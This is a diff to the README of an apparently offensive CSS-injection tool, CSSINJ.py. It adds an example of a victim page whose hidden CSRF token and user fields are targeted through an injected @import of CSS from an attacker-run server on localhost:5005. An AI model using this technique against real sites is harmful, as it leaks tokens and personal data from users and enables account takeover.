@@ -49,6 +49,19 @@ python3 CSSINJ.py [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 
 ### Example  
 
+#### Victim's View :
+```html
+<input type="text" id="username" value="admin" disabled>
+<input type="email" id="email" value="admin@admin.XX" disabled>
+<input type="text" class="csrf" value="MySecretAdminToken" hidden>
+<img src="XXXXXXXXXXX.XX">
+...
+<style>
+  @import url('//localhost:5005/start');
+</style>
+...
+```
+
 #### Using a specific CSS identifier : 
 
 ```bash
